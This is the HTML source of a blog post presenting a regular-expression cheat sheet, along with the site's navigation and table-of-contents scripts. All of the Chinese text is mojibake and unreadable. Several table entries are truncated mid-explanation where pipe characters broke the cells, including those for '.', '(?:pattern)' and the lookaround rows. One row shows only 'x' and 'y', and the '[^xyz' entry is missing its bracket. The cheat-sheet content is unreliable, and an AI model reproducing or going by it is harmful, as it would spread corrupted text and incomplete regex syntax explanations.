<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="keywords" content="é™æ€ä¸ªäººåšå®¢">
<meta name="description" content="è®°å½•ä¸€äº›å­¦ä¹ å·¥ä½œä¸­çš„çŸ¥è¯†ç‚¹ï¼">
<meta name="theme-color" content="#000">
<title>æ­£åˆ™è¡¨è¾¾å¼é€ŸæŸ¥è¡¨ | STAy&#39;s Blog</title>
<link rel="shortcut icon" href="/favicon.ico?v=1684375199109">
<link rel="stylesheet" href="/media/css/pisces.css">
<link rel="stylesheet" href="/media/fonts/font-awesome.css">
<link
  href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rosario:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext"
  rel="stylesheet" type="text/css">

<link href="/media/hljs/styles/default.css"
  rel="stylesheet">

<link rel="stylesheet" href="/styles/main.css">

<script src="/media/hljs/highlight.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css"
  integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">


<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"
  integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"
  integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
  onload="renderMathInElement(document.body);"></script>





  <meta name="description" content="æ­£åˆ™è¡¨è¾¾å¼é€ŸæŸ¥è¡¨" />
  <meta name="keywords" content="" />
</head>

<body>
  <div class="head-top-line"></div>
  <div class="header-box">
    
<div class="pisces">
  <header class="header  ">
    <div class="blog-header box-shadow-wrapper bg-color " id="header">
      <div class="nav-toggle" id="nav_toggle">
        <div class="toggle-box">
          <div class="line line-top"></div>
          <div class="line line-center"></div>
          <div class="line line-bottom"></div>
        </div>
      </div>
      <div class="site-meta">       
        <div class="site-title">
          
            <a href="/" class="brand">
              <span>STAy&#39;s Blog</span>
            </a>  
          
        </div>
        
          <p class="subtitle">è½å¶çš„ä¸€ç”Ÿï¼Œåªä¸ºäº†å½’æ ¹ä¹ˆï¼Ÿ</p>
        
      </div>
      <nav class="site-nav" id="site_nav">
        <ul id="nav_ul">
          
            
            
            <li class="nav-item ">
              
              
                <a href="/" target="_self">
                  <i class="fa fa-home"></i> é¦–é¡µ
                </a>
              
            </li>
          
            
            
            <li class="nav-item ">
              
              
                <a href="/archives/" target="_self">
                  <i class="fa fa-archive"></i> å½’æ¡£
                </a>
              
            </li>
          
            
            
            <li class="nav-item ">
              
              
                <a href="/tags/" target="_self">
                  <i class="fa fa-tags"></i> æ ‡ç­¾
                </a>
              
            </li>
          
          
          
            <li id="fa_search" class="nav-item">
              <a href="javascript:void(0);">
                <i class="fa fa-search"></i> <span class="language" data-lan="search">æœç´¢</span>
              </a>
            </li>
          
        </ul>
      </nav>
    </div>
  </header>
</div>

<script type="text/javascript"> 
 
  let showNav = true;

  let navToggle = document.querySelector('#nav_toggle'),
  siteNav = document.querySelector('#site_nav');
  
  function navClick() {
    let sideBar = document.querySelector('.sidebar');
    let navUl = document.querySelector('#nav_ul');
    navToggle.classList.toggle('nav-toggle-active');
    siteNav.classList.toggle('nav-menu-active');
    if (siteNav.classList.contains('nav-menu-active')) {
      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
    } else {
      siteNav.style = "";
    }
  }

  navToggle.addEventListener('click',navClick);  
</script>
  </div>
  <div class="main-continer">
    
    <div
      class="section-layout pisces ">
      <div class="section-layout-wrapper">
        

<div class="sidebar">
  
    <div class="sidebar-box box-shadow-wrapper bg-color right-motion" id="sidebar">
      
      <div class="sidebar-body pisces" id="sidebar_body">
        
          
            <div style="opacity: 1;">
              <div class="toc-box right-motion">
  <div class="toc-wrapper auto-number no_compress"
    id="toc_wrapper">
    <ul class="markdownIt-TOC">
<li>
<ul>
<li>
<ul>
<li><a href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95">åŸºæœ¬è¯­æ³•</a></li>
<li><a href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E4%B8%B2">å¸¸ç”¨çš„æ­£åˆ™åŒ¹é…ä¸²</a></li>
</ul>
</li>
</ul>
</li>
</ul>

  </div>
</div>

<script>

  let lastTop = 0, lList = [], hList = [], postBody, lastIndex = -1;
  let active = 'active-show', activeClass = 'active-current';
  let tocWrapper = document.querySelector('#toc_wrapper');
  let tocContent = tocWrapper.children[0];
  let autoNumber = tocWrapper && tocWrapper.classList.contains('auto-number');

  function addTocNumber(elem, deep) {
    if (!elem) {
      return;
    }
    let prop = elem.__proto__;

    if (prop === HTMLUListElement.prototype) {
      for (let i = 0; i < elem.children.length; i++) {
        addTocNumber(elem.children[i], deep + (i + 1) + '.');
      }
    } else if (prop === HTMLLIElement.prototype) {
      // ä¿å­˜liå…ƒç´ 
      if (elem.children[0] && elem.children[0].__proto__ === HTMLAnchorElement.prototype) {
        lList.push(elem);
      }
      for (let i = 0; i < elem.children.length; i++) {
        let cur = elem.children[i];
        if (cur.__proto__ === HTMLAnchorElement.prototype) {
          if (autoNumber) {
            cur.text = deep + ' ' + cur.text;
          }
        } else if (cur.__proto__ === HTMLUListElement.prototype) {
          addTocNumber(cur, deep);
        }
      }
    }
  }

  function removeParentActiveClass() {
    let parents = tocContent.querySelectorAll('.' + active)
    parents.forEach(function (elem) {
      elem.classList.remove(active);
    });
  }

  function addActiveClass(index) {
    if (index >= 0 && index < hList.length) {
      lList[index].classList.add(activeClass);
    }
  }

  function removeActiveClass(index) {
    if (index >= 0 && index < hList.length) {
      lList[index].classList.remove(activeClass);
    }
  }

  function addActiveLiElemment(elem, parent) {
    if (!elem || elem === parent) {
      return;
    } else {
      if (elem.__proto__ === HTMLLIElement.prototype) {
        elem.classList.add(active);
      }
      addActiveLiElemment(elem.parentElement, parent);
    }
  }

  function showToc() {
    if (tocWrapper) {
      postBody = document.querySelector('#post_body');
      for (let i = 0; i < postBody.children.length; i++) {
        if (postBody.children[i].__proto__ === HTMLHeadingElement.prototype) {
          hList.push(postBody.children[i]);
        }
      }
      if (tocWrapper.classList.contains('compress')) {
        tocContent.classList.add('closed');
      } else if (tocWrapper.classList.contains('no_compress')) {
        tocContent.classList.add('expanded');
      } else {
        if (hList.length > 10) {
          active = 'active-hidden'
          tocContent.classList.add('closed');
        } else {
          tocContent.classList.add('expanded');
        }
      }
    }
  }

  (function () {
    // å¤„ç†ä¸æ˜¯ä»#ä¸€çº§æ ‡é¢˜å¼€å§‹ç›®å½•
    if (tocContent.children.length === 1 && tocContent.children[0].__proto__ === HTMLLIElement.prototype) {
      let con = tocContent.children[0].children[0];
      tocContent.innerHTML = con.innerHTML;
    }
    let markdownItTOC = document.querySelector('.markdownIt-TOC');
    let innerHeight = window.innerHeight;
    markdownItTOC.style = `max-height: ${innerHeight - 80 > 0 ? innerHeight - 80 : innerHeight}px`
    addTocNumber(tocContent, '');
  })();

  document.addEventListener('scroll', function (e) {
    if (lList.length <= 0) {
      return;
    }
    let scrollTop = document.scrollingElement.scrollTop + 10;
    let dir;

    if (lastTop - scrollTop > 0) {
      dir = 'up';
    } else {
      dir = 'down';
    }

    lastTop = scrollTop;
    if (scrollTop <= 0) {
      if (lastIndex >= 0 && lastIndex < hList.length) {
        lList[lastIndex].classList.remove(activeClass);
      }
      return;
    }

    let current = 0, hasFind = false;
    for (let i = 0; i < hList.length; i++) {
      if (hList[i].offsetTop > scrollTop) {
        current = i;
        hasFind = true;
        break;
      }
    }
    if (!hasFind && scrollTop > lList[lList.length - 1].offsetTop) {
      current = hList.length - 1;
    } else {
      current--;
    }
    if (dir === 'down') {
      if (current > lastIndex) {
        addActiveClass(current);
        removeActiveClass(lastIndex)
        lastIndex = current;
        removeParentActiveClass();
        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
      }
    } else {
      if (current < lastIndex) {
        addActiveClass(current);
        removeActiveClass(lastIndex);
        lastIndex = current;
        removeParentActiveClass();
        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
      }
    }
  });


  window.addEventListener('load', function () {
    showToc();
    document.querySelector('#sidebar').style = 'display: block;';
    tocWrapper.classList.add('toc-active');
    setTimeout(function () {
      if ("createEvent" in document) {
        let evt = document.createEvent("HTMLEvents");
        evt.initEvent("scroll", false, true);
        document.dispatchEvent(evt);
      }
      else {
        document.fireEvent("scroll");
      }
    }, 500)
  })

</script>
            </div>
          
        
      </div>
    </div>
  
</div>
<script>
  const SIDEBAR_TITLE_ACTIVE = 'sidebar-title-active';
  const SIDEBAR_BODY_ACTIVE = 'sidebar-body-active';
  const SLIDE_UP_IN = 'slide-up-in';

  let sidebar = document.querySelector('#sidebar'),
  tocSideBar = document.querySelector('#tocSideBar'),
  metaSideBar = document.querySelector('#metaSideBar'),
  postToc = document.querySelector('#post_toc'),
  postSiteMeta = document.querySelector('#post_side_meta'),
  sidebarTitle = document.querySelector('.sidebar-title'),
  sidebarBody = document.querySelector('#sidebar_body');

  tocSideBar && tocSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  metaSideBar && metaSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  function toggleSidebar(e) {
    let currentTitle = document.querySelector("."+SIDEBAR_TITLE_ACTIVE);
    if (currentTitle == e.srcElement) {
      return ;
    }
    let current, showElement, hideElement;
    if (e.srcElement == metaSideBar) {
      showElement = postSiteMeta;
      hideElement = postToc;
    } else if (e.srcElement == tocSideBar){
      showElement = postToc;
      hideElement = postSiteMeta;
    }
    currentTitle.classList.remove(SIDEBAR_TITLE_ACTIVE);
    e.srcElement.classList.add(SIDEBAR_TITLE_ACTIVE);

    window.Velocity(hideElement, 'stop');
    window.Velocity(hideElement, 'transition.slideUpOut', {
      display: 'none',
      duration: 200,
      complete: function () {
        window.Velocity(showElement, 'transition.slideDownIn', {
          duration: 200
        });
      }
    })
    hideElement.classList.remove(SIDEBAR_BODY_ACTIVE);
    showElement.classList.add(SIDEBAR_BODY_ACTIVE);
  }

  postToc && postToc.addEventListener('transitionend', function() {
    this.classList.remove(SLIDE_UP_IN);
  });

  if (sidebarBody) {
    if (sidebarBody.classList.contains('pisces') || sidebarBody.classList.contains('gemini')) {
      let hasFix = false;
      let scrollEl = document.querySelector('.main-continer');
      let limitTop = document.querySelector('#nav_ul').children.length * 42 + 162;
      window.addEventListener('scroll', function(e) {
        if (document.scrollingElement.scrollTop >= limitTop) {
          if (!hasFix) {
            sidebar.classList.add('sidebar-fixed');
            hasFix = true;
          }
        } else {
          if (hasFix) {
            sidebar.classList.remove('sidebar-fixed');
            hasFix = false;
          }
        }
      });
    }
  }
  
</script>
        <div class="section-box box-shadow-wrapper">
          <div class="section bg-color post post-page">
            <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://cactusii.github.io/post/zheng-ze-biao-da-shi-su-cha-biao/">
      æ­£åˆ™è¡¨è¾¾å¼é€ŸæŸ¥è¡¨
    </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">å‘å¸ƒäº</span>
      <span class="publish-time" data-t="2021-07-15 15:05:32">2021-07-15</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span>8<span class="language" data-lan="minute">åˆ†é’Ÿ</span></span>
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span>1963<span class="pc-show language" data-lan="words">å­—æ•°</span></span>
    </span>
    
  </div>
</section>
            <div class="post-body next-md-body" id="post_body">
              <h3 id="åŸºæœ¬è¯­æ³•">åŸºæœ¬è¯­æ³•</h3>
<table>
<thead>
<tr>
<th>reg</th>
<th style="text-align:center">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>\</td>
<td style="text-align:center">å°†ä¸‹ä¸€ä¸ªå­—ç¬¦æ ‡è®°ä¸ºä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ã€æˆ–ä¸€ä¸ªåŸä¹‰å­—ç¬¦ã€æˆ–ä¸€ä¸ªå‘åå¼•ç”¨ã€æˆ–ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰ç¬¦ã€‚ä¾‹å¦‚ï¼Œ<code>n</code>åŒ¹é…å­—ç¬¦<code>n</code>ã€‚<code>\n</code>åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ä¸²è¡Œ<code>\\</code>åŒ¹é…<code>\</code>è€Œ<code>\(</code>åˆ™åŒ¹é…<code>(</code>ã€‚</td>
</tr>
<tr>
<td>^</td>
<td style="text-align:center">åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ã€‚å¦‚æœè®¾ç½®äº†RegExpå¯¹è±¡çš„Multilineå±æ€§ï¼Œ^ä¹ŸåŒ¹é…<code>\n</code>æˆ–<code>\r</code>ä¹‹åçš„ä½ç½®ã€‚</td>
</tr>
<tr>
<td>$</td>
<td style="text-align:center">åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®ã€‚å¦‚æœè®¾ç½®äº†RegExpå¯¹è±¡çš„Multilineå±æ€§ï¼Œ$ä¹ŸåŒ¹é…<code>\n</code>æˆ–<code>\r</code>ä¹‹å‰çš„ä½ç½®ã€‚</td>
</tr>
<tr>
<td>*</td>
<td style="text-align:center">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œzo*èƒ½åŒ¹é…<code>z</code>ä»¥åŠ<code>zoo</code>ã€‚*ç­‰ä»·äº{0,}ã€‚</td>
</tr>
<tr>
<td>+</td>
<td style="text-align:center">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œ<code>zo+</code>èƒ½åŒ¹é…<code>zo</code>ä»¥åŠ<code>zoo</code>ï¼Œä½†ä¸èƒ½åŒ¹é…<code>z</code>ã€‚+ç­‰ä»·äº{1,}ã€‚</td>
</tr>
<tr>
<td>?</td>
<td style="text-align:center">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ã€‚ä¾‹å¦‚ï¼Œ<code>do(es)?</code>å¯ä»¥åŒ¹é…<code>does</code>æˆ–<code>does</code>ä¸­çš„<code>do</code>ã€‚?ç­‰ä»·äº{0,1}ã€‚</td>
</tr>
<tr>
<td>{n}</td>
<td style="text-align:center">næ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚åŒ¹é…ç¡®å®šçš„næ¬¡ã€‚ä¾‹å¦‚ï¼Œ<code>o{2}</code>ä¸èƒ½åŒ¹é…<code>Bob</code>ä¸­çš„<code>o</code>ï¼Œä½†æ˜¯èƒ½åŒ¹é…<code>food</code>ä¸­çš„ä¸¤ä¸ªoã€‚</td>
</tr>
<tr>
<td>{n,}</td>
<td style="text-align:center">næ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚è‡³å°‘åŒ¹é…næ¬¡ã€‚ä¾‹å¦‚ï¼Œ<code>o{2,}</code>ä¸èƒ½åŒ¹é…<code>Bob</code>ä¸­çš„<code>o</code>ï¼Œä½†èƒ½åŒ¹é…<code>foooood</code>ä¸­çš„æ‰€æœ‰oã€‚<code>o{1,}</code>ç­‰ä»·äº<code>o+</code>ã€‚<code>o{0,}</code>åˆ™ç­‰ä»·äº<code>o*</code>ã€‚</td>
</tr>
<tr>
<td>{n,m}</td>
<td style="text-align:center">må’Œnå‡ä¸ºéè´Ÿæ•´æ•°ï¼Œå…¶ä¸­n&lt;=mã€‚æœ€å°‘åŒ¹é…næ¬¡ä¸”æœ€å¤šåŒ¹é…mæ¬¡ã€‚ä¾‹å¦‚ï¼Œ<code>o{1,3}</code>å°†åŒ¹é…<code>fooooood</code>ä¸­çš„å‰ä¸‰ä¸ªoã€‚<code>o{0,1}</code>ç­‰ä»·äº<code>o?</code>ã€‚è¯·æ³¨æ„åœ¨é€—å·å’Œä¸¤ä¸ªæ•°ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ã€‚</td>
</tr>
<tr>
<td>?</td>
<td style="text-align:center">å½“è¯¥å­—ç¬¦ç´§è·Ÿåœ¨ä»»ä½•ä¸€ä¸ªå…¶ä»–é™åˆ¶ç¬¦ï¼ˆ*,+,?ï¼Œ{n}ï¼Œ{n,}ï¼Œ{n,m}ï¼‰åé¢æ—¶ï¼ŒåŒ¹é…æ¨¡å¼æ˜¯éè´ªå©ªçš„ã€‚éè´ªå©ªæ¨¡å¼å°½å¯èƒ½å°‘çš„åŒ¹é…æ‰€æœç´¢çš„å­—ç¬¦ä¸²ï¼Œè€Œé»˜è®¤çš„è´ªå©ªæ¨¡å¼åˆ™å°½å¯èƒ½å¤šçš„åŒ¹é…æ‰€æœç´¢çš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼Œå¯¹äºå­—ç¬¦ä¸²<code>oooo</code>ï¼Œ<code>o+?</code>å°†åŒ¹é…å•ä¸ª<code>o</code>ï¼Œè€Œ<code>o+</code>å°†åŒ¹é…æ‰€æœ‰<code>o</code>ã€‚</td>
</tr>
<tr>
<td>.</td>
<td style="text-align:center">åŒ¹é…é™¤<code>\n</code>ä¹‹å¤–çš„ä»»ä½•å•ä¸ªå­—ç¬¦ã€‚è¦åŒ¹é…åŒ…æ‹¬<code>\n</code>åœ¨å†…çš„ä»»ä½•å­—ç¬¦ï¼Œè¯·ä½¿ç”¨åƒ`(.</td>
</tr>
<tr>
<td>(pattern)</td>
<td style="text-align:center">åŒ¹é…patternå¹¶è·å–è¿™ä¸€åŒ¹é…ã€‚æ‰€è·å–çš„åŒ¹é…å¯ä»¥ä»äº§ç”Ÿçš„Matchesé›†åˆå¾—åˆ°ï¼Œåœ¨VBScriptä¸­ä½¿ç”¨SubMatchesé›†åˆï¼Œåœ¨JScriptä¸­åˆ™ä½¿ç”¨$0â€¦$9å±æ€§ã€‚è¦åŒ¹é…åœ†æ‹¬å·å­—ç¬¦ï¼Œè¯·ä½¿ç”¨<code>\(</code>æˆ–<code>\)</code>ã€‚</td>
</tr>
<tr>
<td>(?:pattern)</td>
<td style="text-align:center">åŒ¹é…patternä½†ä¸è·å–åŒ¹é…ç»“æœï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¸è¿›è¡Œå­˜å‚¨ä¾›ä»¥åä½¿ç”¨ã€‚è¿™åœ¨ä½¿ç”¨æˆ–å­—ç¬¦`(</td>
</tr>
<tr>
<td>(?=pattern)</td>
<td style="text-align:center">æ­£å‘è‚¯å®šé¢„æŸ¥ï¼Œåœ¨ä»»ä½•åŒ¹é…patternçš„å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥åŒ¹é…ä¸éœ€è¦è·å–ä¾›ä»¥åä½¿ç”¨ã€‚ä¾‹å¦‚ï¼Œ`Windows(?=95</td>
</tr>
<tr>
<td>(?!pattern)</td>
<td style="text-align:center">æ­£å‘å¦å®šé¢„æŸ¥ï¼Œåœ¨ä»»ä½•ä¸åŒ¹é…patternçš„å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥åŒ¹é…ä¸éœ€è¦è·å–ä¾›ä»¥åä½¿ç”¨ã€‚ä¾‹å¦‚`Windows(?!95</td>
</tr>
<tr>
<td>(?&lt;=pattern)</td>
<td style="text-align:center">åå‘è‚¯å®šé¢„æŸ¥ï¼Œä¸æ­£å‘è‚¯å®šé¢„æŸ¥ç±»æ‹Ÿï¼Œåªæ˜¯æ–¹å‘ç›¸åã€‚ä¾‹å¦‚ï¼Œ`(?&lt;=95</td>
</tr>
<tr>
<td>(?&lt;!pattern)</td>
<td style="text-align:center">åå‘å¦å®šé¢„æŸ¥ï¼Œä¸æ­£å‘å¦å®šé¢„æŸ¥ç±»æ‹Ÿï¼Œåªæ˜¯æ–¹å‘ç›¸åã€‚ä¾‹å¦‚`(?&lt;!95</td>
</tr>
<tr>
<td>x</td>
<td style="text-align:center">y</td>
</tr>
<tr>
<td>[xyz]</td>
<td style="text-align:center">å­—ç¬¦é›†åˆã€‚åŒ¹é…æ‰€åŒ…å«çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ<code>[abc]</code>å¯ä»¥åŒ¹é…<code>plain</code>ä¸­çš„<code>a</code>ã€‚</td>
</tr>
<tr>
<td>[^xyz</td>
<td style="text-align:center">è´Ÿå€¼å­—ç¬¦é›†åˆã€‚åŒ¹é…æœªåŒ…å«çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ<code>[^abc]</code>å¯ä»¥åŒ¹é…<code>plain</code>ä¸­çš„<code>p</code>ã€‚</td>
</tr>
<tr>
<td>[a-z]</td>
<td style="text-align:center">å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ<code>[a-z]</code>å¯ä»¥åŒ¹é…<code>a</code>åˆ°<code>z</code>èŒƒå›´å†…çš„ä»»æ„å°å†™å­—æ¯å­—ç¬¦ã€‚</td>
</tr>
<tr>
<td>[^a-z]</td>
<td style="text-align:center">è´Ÿå€¼å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…ä»»ä½•ä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ<code>[^a-z]</code>å¯ä»¥åŒ¹é…ä»»ä½•ä¸åœ¨<code>a</code>åˆ°<code>z</code>èŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚</td>
</tr>
<tr>
<td>\b</td>
<td style="text-align:center">åŒ¹é…ä¸€ä¸ªå•è¯è¾¹ç•Œï¼Œä¹Ÿå°±æ˜¯æŒ‡å•è¯å’Œç©ºæ ¼é—´çš„ä½ç½®ã€‚ä¾‹å¦‚ï¼Œ<code>er\b</code>å¯ä»¥åŒ¹é…<code>never</code>ä¸­çš„<code>er</code>ï¼Œä½†ä¸èƒ½åŒ¹é…<code>verb</code>ä¸­çš„<code>er</code>ã€‚</td>
</tr>
<tr>
<td>\B</td>
<td style="text-align:center">åŒ¹é…éå•è¯è¾¹ç•Œã€‚<code>er\B</code>èƒ½åŒ¹é…<code>verb</code>ä¸­çš„<code>er</code>ï¼Œä½†ä¸èƒ½åŒ¹é…<code>never</code>ä¸­çš„<code>er</code>ã€‚</td>
</tr>
<tr>
<td>\cx</td>
<td style="text-align:center">åŒ¹é…ç”±xæŒ‡æ˜çš„æ§åˆ¶å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ\cMåŒ¹é…ä¸€ä¸ªControl-Mæˆ–å›è½¦ç¬¦ã€‚xçš„å€¼å¿…é¡»ä¸ºA-Zæˆ–a-zä¹‹ä¸€ã€‚å¦åˆ™ï¼Œå°†cè§†ä¸ºä¸€ä¸ªåŸä¹‰çš„<code>c</code>å­—ç¬¦ã€‚</td>
</tr>
<tr>
<td>\d</td>
<td style="text-align:center">åŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº[0-9]ã€‚</td>
</tr>
<tr>
<td>\D</td>
<td style="text-align:center">åŒ¹é…ä¸€ä¸ªéæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº[^0-9]ã€‚</td>
</tr>
<tr>
<td>\f</td>
<td style="text-align:center">åŒ¹é…ä¸€ä¸ªæ¢é¡µç¬¦ã€‚ç­‰ä»·äº\x0cå’Œ\cLã€‚</td>
</tr>
<tr>
<td>\n</td>
<td style="text-align:center">åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ç­‰ä»·äº\x0aå’Œ\cJã€‚</td>
</tr>
<tr>
<td>\r</td>
<td style="text-align:center">åŒ¹é…ä¸€ä¸ªå›è½¦ç¬¦ã€‚ç­‰ä»·äº\x0då’Œ\cMã€‚</td>
</tr>
<tr>
<td>\s</td>
<td style="text-align:center">åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ã€‚ç­‰ä»·äº[ \f\n\r\t\v]ã€‚</td>
</tr>
<tr>
<td>\S</td>
<td style="text-align:center">åŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦ã€‚ç­‰ä»·äº[^ \f\n\r\t\v]ã€‚</td>
</tr>
<tr>
<td>\t</td>
<td style="text-align:center">åŒ¹é…ä¸€ä¸ªåˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äº\x09å’Œ\cIã€‚</td>
</tr>
<tr>
<td>\v</td>
<td style="text-align:center">åŒ¹é…ä¸€ä¸ªå‚ç›´åˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äº\x0bå’Œ\cKã€‚</td>
</tr>
<tr>
<td>\w</td>
<td style="text-align:center">åŒ¹é…åŒ…æ‹¬ä¸‹åˆ’çº¿çš„ä»»ä½•å•è¯å­—ç¬¦ã€‚ç­‰ä»·äº<code>[A-Za-z0-9_]</code>ã€‚</td>
</tr>
<tr>
<td>\W</td>
<td style="text-align:center">åŒ¹é…ä»»ä½•éå•è¯å­—ç¬¦ã€‚ç­‰ä»·äº<code>[^A-Za-z0-9_]</code>ã€‚</td>
</tr>
<tr>
<td>\xn</td>
<td style="text-align:center">åŒ¹é…nï¼Œå…¶ä¸­nä¸ºåå…­è¿›åˆ¶è½¬ä¹‰å€¼ã€‚åå…­è¿›åˆ¶è½¬ä¹‰å€¼å¿…é¡»ä¸ºç¡®å®šçš„ä¸¤ä¸ªæ•°å­—é•¿ã€‚ä¾‹å¦‚ï¼Œ<code>\x41</code>åŒ¹é…<code>A</code>ã€‚<code>\x041</code>åˆ™ç­‰ä»·äº<code>\x04&amp;1</code>ã€‚æ­£åˆ™è¡¨è¾¾å¼ä¸­å¯ä»¥ä½¿ç”¨ASCIIç¼–ç ã€‚.</td>
</tr>
<tr>
<td>\num</td>
<td style="text-align:center">åŒ¹é…numï¼Œå…¶ä¸­numæ˜¯ä¸€ä¸ªæ­£æ•´æ•°ã€‚å¯¹æ‰€è·å–çš„åŒ¹é…çš„å¼•ç”¨ã€‚ä¾‹å¦‚ï¼Œ<code>(.)\1</code>åŒ¹é…ä¸¤ä¸ªè¿ç»­çš„ç›¸åŒå­—ç¬¦ã€‚</td>
</tr>
<tr>
<td>\n</td>
<td style="text-align:center">æ ‡è¯†ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼æˆ–ä¸€ä¸ªå‘åå¼•ç”¨ã€‚å¦‚æœ\nä¹‹å‰è‡³å°‘nä¸ªè·å–çš„å­è¡¨è¾¾å¼ï¼Œåˆ™nä¸ºå‘åå¼•ç”¨ã€‚å¦åˆ™ï¼Œå¦‚æœnä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-7ï¼‰ï¼Œåˆ™nä¸ºä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼ã€‚</td>
</tr>
<tr>
<td>\nm</td>
<td style="text-align:center">æ ‡è¯†ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼æˆ–ä¸€ä¸ªå‘åå¼•ç”¨ã€‚å¦‚æœ\nmä¹‹å‰è‡³å°‘æœ‰nmä¸ªè·å¾—å­è¡¨è¾¾å¼ï¼Œåˆ™nmä¸ºå‘åå¼•ç”¨ã€‚å¦‚æœ\nmä¹‹å‰è‡³å°‘æœ‰nä¸ªè·å–ï¼Œåˆ™nä¸ºä¸€ä¸ªåè·Ÿæ–‡å­—mçš„å‘åå¼•ç”¨ã€‚å¦‚æœå‰é¢çš„æ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œè‹¥nå’Œmå‡ä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-7ï¼‰ï¼Œåˆ™\nmå°†åŒ¹é…å…«è¿›åˆ¶è½¬ä¹‰å€¼nmã€‚</td>
</tr>
<tr>
<td>\nml</td>
